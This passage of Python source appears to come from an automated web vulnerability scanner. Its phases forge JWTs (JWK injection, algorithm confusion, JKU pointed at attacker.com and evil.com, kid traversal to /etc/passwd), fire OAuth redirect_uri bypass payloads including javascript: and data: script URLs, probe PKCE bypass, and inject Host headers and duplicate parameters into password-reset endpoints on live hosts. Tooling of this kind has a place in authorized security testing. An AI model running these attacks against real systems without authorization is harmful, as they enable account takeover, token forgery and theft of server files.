                        forged_jwk_token = f"{forged_jwk_b64}.{parts[1]}.{parts[2]}"
                        findings.append(
                            f"[jwtadv-jwk-injection] {url} — embedded attacker JWK: {forged_jwk_token[:80]}..."
                        )
                        (
                            ajs,
                            aj_base,
                            aj_garbage,
                            aj_body,
                            aj_base_body,
                            aj_garbage_body,
                        ) = await _jwt_acceptance_verdict(
                            _ja_urlopen,
                            url,
                            {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                            forged_jwk_token,
                        )
                        if _jwt_forge_accepted(
                            ajs,
                            aj_base,
                            aj_garbage,
                            aj_body,
                            aj_base_body,
                            aj_garbage_body,
                        ):
                            findings.append(
                                f"[jwtadv-jwk-injection-accepted] {url} — JWK injection accepted (HTTP {ajs}, baseline={aj_base}, garbage={aj_garbage})"
                            )
                    # Extended algorithm confusion: EdDSA→HS256, RS384→HS384, RS512→HS512
                    for test_alg, hmac_mod, hmac_alg in [
                        ("EdDSA", "sha256", "sha256"),
                        ("RS384", "sha384", "sha384"),
                        ("RS512", "sha512", "sha512"),
                    ]:
                        import hmac as _hmac_e2

                        confused_sig = _hmac_e2.new(
                            b"public_key_confusion_test",
                            (parts[0] + "." + parts[1]).encode(),
                            hmac_mod,
                        ).digest()
                        confused_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
                        confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
                        (
                            ec2s,
                            ec2_base,
                            ec2_garbage,
                            ec2_body,
                            ec2_base_body,
                            ec2_garbage_body,
                        ) = await _jwt_acceptance_verdict(
                            _ja_urlopen,
                            url,
                            {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                            confused_token,
                        )
                        if _jwt_forge_accepted(
                            ec2s,
                            ec2_base,
                            ec2_garbage,
                            ec2_body,
                            ec2_base_body,
                            ec2_garbage_body,
                        ):
                            findings.append(
                                f"[jwtadv-alg-confusion-{test_alg}] {url} — {test_alg}→HS{hmac_alg[-3:]} confused token accepted (HTTP {ec2s}, baseline={ec2_base}, garbage={ec2_garbage})"
                            )
                            break
                    # JKU injection with attacker-controlled JWKS URL
                    if "jku" in header:
                        attacker_jku_list = [
                            "https://attacker.com/jwks.json",
                            "http://evil.com/keys",
                        ]
                        for ajku_url in attacker_jku_list:
                            forged_jku = header.copy()
                            forged_jku["jku"] = ajku_url
                            forged_jku_b64 = (
                                base64.urlsafe_b64encode(json.dumps(forged_jku).encode())
                                .rstrip(b"=")
                                .decode()
                            )
                            forged_jku_token = f"{forged_jku_b64}.{parts[1]}.{parts[2]}"
                            (
                                ajkus,
                                ajku_base,
                                ajku_garbage,
                                ajku_body,
                                ajku_base_body,
                                ajku_garbage_body,
                            ) = await _jwt_acceptance_verdict(
                                _ja_urlopen,
                                url,
                                {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                                forged_jku_token,
                            )
                            if _jwt_forge_accepted(
                                ajkus,
                                ajku_base,
                                ajku_garbage,
                                ajku_body,
                                ajku_base_body,
                                ajku_garbage_body,
                            ):
                                findings.append(
                                    f"[jwtadv-jku-attacker-injection] {url} — JKU {ajku_url} accepted — attacker-controlled JWKS (HTTP {ajkus}, baseline={ajku_base}, garbage={ajku_garbage})"
                                )
                                break
                    # KID: extra traversal payloads with file read detection
                    if "kid" in header:
                        for kid_payload in [
                            "../../../../etc/passwd",
                            "../../../../etc/hostname",
                            "../../public.key",
                            "/dev/null",
                            "/etc/passwd",
                        ]:
                            forged_kid = header.copy()
                            forged_kid["kid"] = kid_payload
                            forged_b64 = (
                                base64.urlsafe_b64encode(json.dumps(forged_kid).encode())
                                .rstrip(b"=")
                                .decode()
                            )
                            forged_kid_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                            (
                                ks,
                                k_base,
                                k_garbage,
                                k_body,
                                k_base_body,
                                k_garbage_body,
                            ) = await _jwt_acceptance_verdict(
                                _ja_urlopen,
                                url,
                                {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                                forged_kid_token,
                            )
                            if (
                                ks in (200, 201)
                                and any(w in k_body for w in ["root:", "daemon:", "localhost"])
                                and not any(
                                    w in k_base_body for w in ["root:", "daemon:", "localhost"]
                                )
                            ):
                                findings.append(
                                    f"[jwtadv-kid-file-read] {url} — KID={kid_payload} returned file contents (HTTP {ks}, baseline={k_base})"
                                )
                                break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    if not findings:
        findings.append("[jwtadv] No JWT tokens found for advanced analysis")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"36-JWTADV: {len(findings)} JWT analysis findings -> {out}")
    return {"36-JWTADV": str(out), "count": len(findings)}


_OAUTH_ENDPOINTS = [
    "/oauth/authorize",
    "/oauth/token",
    "/oauth/v2/authorize",
    "/oauth/v2/token",
    "/oauth2/authorize",
    "/oauth2/token",
    "/oauth2/v1/authorize",
    "/oauth2/v1/token",
    "/auth",
    "/token",
    "/authorize",
    "/connect/token",
    "/connect/authorize",
    "/api/oauth/token",
    "/api/oauth/authorize",
]


async def phase_39_OAUTH(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"39-OAUTH"}:
        return {}
    _out = outdir / "oauth_misconfig.txt"
    if _out.exists() and not force:
        return {"39-OAUTH": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 39-OAUTH: OAuth misconfiguration testing")
    findings: List[str] = []
    # Load JWT analysis findings to inform OAuth testing
    jwt_file = outdir / "jwt_analysis.txt"
    if jwt_file.exists():
        jwt_findings = read_lines(jwt_file)
        if jwt_findings:
            for jf in jwt_findings[:10]:
                findings.append(f"[from-jwt] {jf}")
    _oa_urlopen = _get_urlopener()
    _oa_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = [f"https://{_extract_host(h)}" for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_jwt
    ]
    if not hosts:
        log("WARNING", "39-OAUTH: no hosts; skipping")
        return {"39-OAUTH": str(_out), "count": 0}
    endpoints_to_test: List[str] = []
    for base in hosts:
        for oauth_ep in _OAUTH_ENDPOINTS:
            endpoints_to_test.append(base.rstrip("/") + oauth_ep)
    endpoints_to_test = endpoints_to_test[: _PIPELINE_CFG.sample_endpoints_oauth * 5]

    async def _probe_oauth(ep_url: str) -> Optional[str]:
        try:
            req = urllib.request.Request(
                ep_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers}
            )
            s, h, _ = await _async_urlopen_no_redirect(req, timeout=8)
            if s in (200, 201, 302, 301, 405):
                if s not in (302, 301):
                    try:
                        req2 = urllib.request.Request(
                            ep_url,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers},
                        )
                        _, _, _ = await _async_urlopen_no_redirect(req2, timeout=8)
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        pass
                return f"[oauth-endpoint] {ep_url} -> HTTP {s}"
            return None
        except asyncio.CancelledError:
            raise
        except Exception:
            return None

    ep_results = await asyncio.gather(*[_probe_oauth(ep) for ep in endpoints_to_test])
    for r in ep_results:
        if r:
            findings.append(r)
    for ep_url in [ep for ep in endpoints_to_test if any(m in ep.lower() for m in ("authorize",))]:
        try:
            req = urllib.request.Request(
                ep_url
                + "?response_type=code&client_id=test&redirect_uri=https://evil.com&scope=openid",
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers},
            )
            s, rh, _ = await _async_urlopen_no_redirect(req, timeout=8)
            loc = rh.get("Location", "")
            if "evil.com" in loc:
                findings.append(
                    f"[oauth-open-redirect] {ep_url} — redirect_uri accepted https://evil.com"
                )
            req2 = urllib.request.Request(
                ep_url
                + "?response_type=code&client_id=test&redirect_uri=https://evil.com%2f.evil2.com&scope=openid",
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers},
            )
            s2, rh2, _ = await _async_urlopen_no_redirect(req2, timeout=8)
            loc2 = rh2.get("Location", "")
            if "evil2.com" in loc2:
                findings.append(
                    f"[oauth-redirect-bypass] {ep_url} — redirect_uri parser bypass: %2f.evil2.com"
                )
        except urllib.error.HTTPError as e:
            loc3 = e.headers.get("Location", "")
            if "evil.com" in loc3 or "evil2.com" in loc3:
                findings.append(f"[oauth-redirect-error] {ep_url} -> HTTP {e.code} Location={loc3}")
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    # Device authorization grant probe
    device_code_endpoints = [
        "/device",
        "/oauth/device",
        "/oauth2/device",
        "/device/code",
        "/oauth/device/code",
    ]
    for base_host in hosts:
        for dev_ep in device_code_endpoints:
            dev_url = base_host.rstrip("/") + dev_ep
            try:
                dev_req = urllib.request.Request(
                    dev_url,
                    data=b"client_id=test_device_client",
                    method="POST",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0",
                        **_oa_extra_headers,
                    },
                )
                dev_s, _, dev_b = await _async_urlopen(_oa_urlopen, dev_req, timeout=8)
                dev_text = dev_b.decode("utf-8", errors="ignore")
                if dev_s in (200, 201) and ("device_code" in dev_text or "user_code" in dev_text):
                    findings.append(
                        f"[oauth-device-auth] {dev_url} — device authorization endpoint active (HTTP {dev_s})"
                    )
                    findings.append(
                        "  [oauth-device-auth] Test: brute-force user_code (4-8 char alphanumeric) to authorize without device"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue

    # PKCE bypass check
    findings.append("")
    findings.append("--- PKCE Bypass Tests ---")
    for base_host in hosts:
        token_ep = base_host.rstrip("/") + "/oauth/token"
        for pkce_test in [
            {"code_verifier": "", "code_challenge_method": "plain"},
            {"code_verifier": "test", "code_challenge_method": "S256", "code_challenge": "test"},
        ]:
            try:
                pkce_data = {
                    "grant_type": "authorization_code",
                    "code": "test_auth_code",
                    "client_id": "test_client",
                    "redirect_uri": "https://evil.com",
                }
                pkce_data.update(pkce_test)
                pkce_req = urllib.request.Request(
                    token_ep,
                    data=urllib.parse.urlencode(pkce_data).encode(),
                    method="POST",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0",
                        **_oa_extra_headers,
                    },
                )
                _, _, pkce_b = await _async_urlopen(_oa_urlopen, pkce_req, timeout=8)
                pkce_text = pkce_b.decode("utf-8", errors="ignore")
                if "access_token" in pkce_text:
                    findings.append(
                        f"[oauth-pkce-bypass] {token_ep} — PKCE with method={pkce_test.get('code_challenge_method', 'none')} not enforced, token issued"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        break  # Test only one host

    # Token swapping note
    findings.append("")
    findings.append(
        "[oauth-token-swapping] Note: If multiple OAuth clients share the same authorization server, test exchanging authorization codes between different clients"
    )
    findings.append(
        "[oauth-token-swapping] Example: Get code from client A, exchange at client B's token endpoint"
    )

    if not findings:
        findings.append("[oauth] No OAuth endpoints found or no misconfigurations detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"39-OAUTH: {len(findings)} OAuth probes -> {out}")
    return {"39-OAUTH": str(out), "count": len(findings)}


# ────────────────── Phase 40-PWRESET: Password Reset Logic ─────────────────────
_PWRESET_ENDPOINTS = [
    "/reset",
    "/reset-password",
    "/forgot",
    "/forgot-password",
    "/password/reset",
    "/password/forgot",
    "/api/reset",
    "/api/forgot",
    "/password-reset",
    "/account/reset",
    "/user/reset",
]
_PWRESET_EMAIL_PARAMS = ["email", "user", "username", "account", "userid", "user_id"]


async def phase_40_PWRESET(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"40-PWRESET"}:
        return {}
    _out = outdir / "password_reset.txt"
    if _out.exists() and not force:
        return {"40-PWRESET": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 40-PWRESET: password reset logic testing")
    findings: List[str] = []
    # Load JWT analysis findings to inform password reset testing
    jwt_file = outdir / "jwt_analysis.txt"
    jwt_adv_file = outdir / "jwt_advanced.txt"
    if jwt_file.exists():
        jwt_findings = read_lines(jwt_file)
        if jwt_findings:
            for jf in jwt_findings[:5]:
                findings.append(f"[from-jwt] {jf}")
    if jwt_adv_file.exists():
        jwt_adv_findings = read_lines(jwt_adv_file)
        if jwt_adv_findings:
            for jaf in jwt_adv_findings[:5]:
                findings.append(f"[from-jwtadv] {jaf}")
    _pw_urlopen = _get_urlopener()
    _pw_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = [f"https://{_extract_host(h)}" for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_jwt
    ]
    if not hosts:
        log("WARNING", "40-PWRESET: no hosts; skipping")
        return {"40-PWRESET": str(_out), "count": 0}
    endpoints = []
    for base in hosts:
        for ep in _PWRESET_ENDPOINTS:
            endpoints.append(base.rstrip("/") + ep)
    for ep_url in endpoints[: _PIPELINE_CFG.sample_endpoints_pwreset]:
        try:
            req = urllib.request.Request(
                ep_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_pw_extra_headers}
            )
            s, h, b = await _async_urlopen_no_redirect(req, timeout=8)
            if s in (200, 201, 302, 301):
                findings.append(f"[pwreset-endpoint] {ep_url} -> HTTP {s}")
                for pname in _PWRESET_EMAIL_PARAMS:
                    test_url = ep_url + (
                        ("?" if "?" not in ep_url else "&")
                        + f"{pname}=victim@evil.com&{pname}=attacker@evil.com"
                    )
                    try:
                        req2 = urllib.request.Request(
                            test_url,
                            method="POST",
                            data=b"email=attacker@evil.com",
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": "Mozilla/5.0",
                                **_pw_extra_headers,
                            },
                        )
                        s2, _, b2 = await _async_urlopen_no_redirect(req2, timeout=8)
                        if s2 in (200, 201, 302):
                            findings.append(
                                f"[pwreset-param-pollution] {ep_url} — {pname} accepts email param"
                            )
                    except urllib.error.HTTPError:
                        pass
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
                try:
                    host_inject_req = urllib.request.Request(
                        ep_url,
                        method="POST",
                        data=b"email=test@test.com",
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Host": "evil.com",
                            **_pw_extra_headers,
                        },
                    )
                    s3, h3, _ = await _async_urlopen_no_redirect(host_inject_req, timeout=8
                    )
                    loc = h3.get("Location", "") or h3.get("location", "")
                    if "evil.com" in loc:
                        findings.append(
                            f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc}"
                        )
                except urllib.error.HTTPError as e:
                    loc = e.headers.get("Location", "") or e.headers.get("location", "")
                    if "evil.com" in loc:
                        findings.append(
                            f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc} (HTTP {e.code})"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    if not findings:
        findings.append("[pwreset] No password reset endpoints or logic issues detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"40-PWRESET: {len(findings)} password reset probes -> {out}")
    return {"40-PWRESET": str(out), "count": len(findings)}


_OAUTH_ADV_PATHS = [
    "/oauth/callback",
    "/oauth2/callback",
    "/auth/callback",
    "/login/oauth2/code",
    "/oauth/authorize",
    "/oauth/token",
    "/oauth2/authorize",
    "/oauth2/token",
    "/auth/realms",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

_OAUTH_ADV_REDIRECT_BYPASSES = [
    "https://evil.com",
    "https://evil.com/@{domain}",
    "https://{domain}.evil.com",
    "https://{domain}@evil.com",
    "https://evil.com/{domain}",
    "https://evil.com/?url=https://{domain}",
    "https://{domain}.evil.com/",
    "https://evil.com\\@{domain}",
    "https://evil.com#@{domain}",
    "https://{domain}%40evil.com",
    "data:text/html,<script>location='https://evil.com'</script>",
    "javascript:document.location='https://evil.com'",
]


async def phase_61_OAUTH_ADV(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"61-OAUTH-ADV"}:
        return {}
    _out = outdir / "oauth_advanced.txt"
    if _out.exists() and not force:
        return {"61-OAUTH-ADV": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 61-OAUTH-ADV: advanced OAuth redirect_uri bypass testing")
    findings: List[str] = []
    _o_urlopen = _get_urlopener()
    _o_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("WARNING", "61-OAUTH-ADV: no hosts; skipping")
        return {"61-OAUTH-ADV": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = _extract_host(host)
        if not host_clean:
            continue
        for scheme in ("https://",):
            base = f"{scheme}{host_clean}"
            for path in _OAUTH_ADV_PATHS:
                url = f"{base}{path}"
                try:
                    req = urllib.request.Request(
                        url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers}
                    )
                    s, _, _ = await _async_urlopen(_o_urlopen, req, timeout=8)
                    if s not in (200, 302, 301, 303, 307):
                        continue
                    findings.append(f"[oauth-endpoint] {url} — HTTP {s}")
                    for bypass in _OAUTH_ADV_REDIRECT_BYPASSES:
                        bypass_url = bypass.replace("{domain}", domain)
                        for param in (
                            "redirect_uri",
                            "redirect",
                            "callback",
                            "return",
                            "next",
                            "url",
                            "continue",
                            "destination",
                            "r",
                        ):
                            test_url = f"{url}?{param}={bypass_url}"
                            try:
                                treq = urllib.request.Request(
                                    test_url,
                                    method="GET",
                                    headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers},
                                )
                                ts, theaders, _ = await _async_urlopen_no_redirect(treq, timeout=8
                                )
                                loc = theaders.get("Location", "")
                                if ts in (301, 302, 303, 307, 308) and "evil.com" in loc:
                                    findings.append(
                                        f"[oauth-redirect-bypass] {test_url} — param={param} "
                                        f"redirect_uri={bypass_url} — redirect to attacker domain (HTTP {ts})"
                                    )
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue

    # Device authorization grant probe
    for host in hosts[:3]:
        host_clean = _extract_host(host)
        for dev_ep in ["/device", "/oauth/device", "/oauth2/device", "/device/code"]:
            dev_url = f"https://{host_clean}{dev_ep}"
            try:
                dev_req = urllib.request.Request(
                    dev_url,
                    data=b"client_id=test_device",
                    method="POST",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0",
                        **_o_extra_headers,
                    },
                )
                dev_s, _, dev_b = await _async_urlopen(_o_urlopen, dev_req, timeout=8)
                dev_text = dev_b.decode("utf-8", errors="ignore")
                if dev_s in (200, 201) and ("device_code" in dev_text or "user_code" in dev_text):
                    findings.append(
                        f"[oauth-device-auth] {dev_url} — device authorization endpoint active"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue

    # PKCE bypass test
    findings.append("")
    findings.append("--- PKCE Analysis ---")
    findings.append("[oauth-pkce] Check if server accepts:")
    findings.append("[oauth-pkce] 1. plain code_challenge_method (should be S256 only)")
    findings.append("[oauth-pkce] 2. Missing code_verifier in token request")
    findings.append("[oauth-pkce] 3. Empty code_verifier value")

    # Token swapping note
    findings.append("")
    findings.append("[oauth-token-swapping] Test exchanging authorization codes between clients:")
    findings.append(
        "[oauth-token-swapping] 1. Get auth code from client A (with redirect_uri for client A)"
    )
    findings.append("[oauth-token-swapping] 2. Exchange at client B's token endpoint")
    findings.append("[oauth-token-swapping] 3. If accepted, code reuse across clients is possible")

    if not findings:
        findings.append("[oauth-adv] No advanced OAuth bypasses detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"61-OAUTH-ADV: {len(findings)} OAuth findings → {out}")
    return {"61-OAUTH-ADV": str(out), "count": len(findings)}


_SESSION_HEADERS_TO_CHECK = [
    ("HttpOnly", "httpOnly"),
    ("Secure", "secure"),
    ("SameSite", "samesite"),
    ("Path", "path"),
    ("Domain", "domain"),
    ("Max-Age", "max-age"),
    ("Expires", "expires"),
]


async def phase_65_SESSION(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"65-SESSION"}:
        return {}
    _out = outdir / "session_analysis.txt"
    if _out.exists() and not force:
        return {"65-SESSION": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 65-SESSION: session token analysis")
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _s_extra = _extra_headers_dict()

    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [h for h in read_lines(hosts_file)][: _PIPELINE_CFG.sample_hosts_ssl]
    for host in targets:
        await _throttle_rate()
        try:
            req = urllib.request.Request(
                host, method="GET", headers={"User-Agent": "Mozilla/5.0", **_s_extra}
            )
            status, headers, body_bytes = await _async_urlopen(_s_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

        set_cookie = parse_set_cookie_headers(headers) or [headers.get("Set-Cookie", "")]
        for cookie_str in set_cookie:
            if not cookie_str:
                continue
            cookie_name = (
                cookie_str.split("=", 1)[0].strip() if "=" in cookie_str else cookie_str[:30]
            )
            findings.append(
                f"[cookie] {host} → Set-Cookie: {cookie_name}={cookie_str[len(cookie_name) + 1 :][:80]}…"
            )
            for attr_name, attr_lower in _SESSION_HEADERS_TO_CHECK:
                if attr_lower not in cookie_str.lower():
                    findings.append(
                        f"[cookie-missing-{attr_name}] {cookie_name} lacks {attr_name} flag ({host})"
                    )

        for m in re.finditer(
            r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", body
        ):
            jwt_raw = m.group()
            try:
                parts = jwt_raw.split(".")

                def pad(s):
                    return "=" * ((4 - len(s) % 4) % 4)

                header_b64 = parts[0] + pad(parts[0])
                payload_b64 = parts[1] + pad(parts[1])
                header_decoded = json.loads(
                    base64.b64decode(header_b64).decode("utf-8", errors="ignore")
                )
                payload_decoded = json.loads(
                    base64.b64decode(payload_b64).decode("utf-8", errors="ignore")
                )
                alg = header_decoded.get("alg", "unknown")
                exp = payload_decoded.get("exp", 0)
                iat = payload_decoded.get("iat", 0)
                findings.append(f"[jwt-found] {host} → alg={alg} exp={exp} iat={iat}")
                if alg == "none":
                    findings.append(
                        f"[jwt-none-alg] {host} → JWT uses 'none' algorithm (vulnerable)"
                    )
                if not payload_decoded.get("exp"):
                    findings.append(f"[jwt-no-exp] {host} → JWT has no expiration")
            except asyncio.CancelledError:
                raise
            except Exception:
                findings.append(f"[jwt-raw] {host} → {jwt_raw[:60]}… (unparseable)")

        if "session" in body.lower() or "token" in body.lower():
            for m in re.finditer(r"[\"\'][A-Za-z0-9+/=]{20,}[\"\']", body):
                val = m.group().strip("\"'")
                freq: dict[str, int] = {}
                for c in val:
                    freq[c] = freq.get(c, 0) + 1
                entropy = 0.0
                for f in freq.values():
                    p = f / len(val)
                    entropy -= p * math.log2(p)
                if entropy > 4.5 and len(val) >= 20:
                    findings.append(
                        f"[high-entropy-token] {host} → {val[:40]}… (entropy={entropy:.2f})"
                    )

    if not findings:
        findings.append("[session] No session tokens or cookies found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"65-SESSION: {len(findings)} findings → {out}")
    return {"65-SESSION": str(out), "count": len(findings)}


async def phase_82_OAUTHDEEP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"82-OAUTHDEEP"}:
        return {}
    _out = outdir / "oauth_deep.txt"
    if _out.exists() and not force:
        return {"82-OAUTHDEEP": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 82-OAUTHDEEP: OAuth redirect_uri parser diff + PKCE/state analysis")
    findings: List[str] = []
    _oa_urlopen = _get_urlopener()
    _oa_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    oauth_patterns = [
        "/oauth",
        "/oauth2",
        "/auth",
        "/authorize",
        "/authorization",
        "/token",
        "/oauth/token",
        "/oauth2/token",
        "/connect/token",
        "client_id=",
        "redirect_uri=",
        "response_type=",
        "scope=",
        ".well-known/openid-configuration",
        ".well-known/oauth-authorization-server",
    ]
    oauth_urls: List[str] = []
    _skip_domains = ("jimcdn.com", "jimdo.com", "cdn.", "assets.", "static.", "img.", "images.")
    if urls_file.exists():
        for u in read_lines(urls_file):
            u_lower = u.lower()
            if any(sd in u_lower for sd in _skip_domains):
                continue
            if any(p in u_lower for p in oauth_patterns):
                oauth_urls.append(u)
    live_hosts = _load_live_hosts(outdir)
    for h in live_hosts:
        for p in oauth_patterns:
            if not p.startswith("/"):
                continue
            url = (h if h.startswith("http") else f"https://{h}") + p
            oauth_urls.append(url)
    findings.append(f"[oauth-endpoints] {len(oauth_urls)} potential OAuth endpoints")
    for u in sorted(set(oauth_urls))[:20]:
        findings.append(f"  {u}")
    # Test redirect_uri parser differentials
    redirect_uri_variants = [
        "https://evil.com",
        "https://{domain}.evil.com",
        "https://{domain}.com.evil.com",
        "https://evil.com/{domain}",
        "https://evil.com/?redirect={domain}",
        "https://{domain}@evil.com",
        "https://{domain}:password@evil.com",
        "https://evil.com\\@{domain}",
        "https://evil.com#@{domain}",
    ]
    findings.append("")
    findings.append("--- redirect_uri parser differentials ---")
    for u in sorted(set(oauth_urls))[:10]:
        if "redirect_uri=" in u.lower():
            for var in redirect_uri_variants[:5]:
                test = u.replace(
                    "redirect_uri=", f"redirect_uri={var.replace('{domain}', 'target.com')}"
                )
                findings.append(f"  [redirect-test] {test[:150]}")
        elif u.startswith("http") and "/authorize" in u:
            for var in redirect_uri_variants[:5]:
                sep = "&" if "?" in u else "?"
                test = f"{u}{sep}redirect_uri={var.replace('{domain}', 'target.com')}"
                findings.append(f"  [redirect-test] {test[:150]}")
    # PKCE analysis and state parameter analysis
    findings.append("")
    findings.append("--- PKCE / State Analysis ---")
    findings.append("[oauth-pkce] Check token endpoints for PKCE enforcement:")
    findings.append("[oauth-pkce] 1. Is code_challenge_method restricted to S256 only?")
    findings.append("[oauth-pkce] 2. Is code_verifier validated against code_challenge?")
    findings.append("[oauth-pkce] 3. Can tokens be obtained without PKCE (missing code_verifier)?")
    findings.append("[oauth-state] Check if state parameter is validated (CSRF protection)")
    findings.append("[oauth-state] Missing state → CSRF on OAuth flow")

    # Device authorization grant endpoint detection
    findings.append("")
    findings.append("--- Device Authorization Grant ---")
    for u in sorted(set(oauth_urls))[:10]:
        parsed = urllib.parse.urlparse(u)
        if "/device" in parsed.path.lower() or "/code" in parsed.path.lower():
            findings.append(
                f"  [oauth-device-endpoint] {u} — potential device authorization endpoint"
            )

    # Token swapping notes
    findings.append("")
    findings.append("--- Token Swapping ---")
    findings.append("[oauth-token-swap] Test authorization code reuse across different clients:")
    findings.append("[oauth-token-swap] 1. Capture auth code from client A's authorize redirect")
    findings.append("[oauth-token-swap] 2. Exchange at client B's /token endpoint")
    findings.append("[oauth-token-swap] 3. If successful, code injection is possible")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"82-OAUTHDEEP: {len(findings)} OAuth deep findings → {out}")
    return {"82-OAUTHDEEP": str(_out), "count": len(findings)}
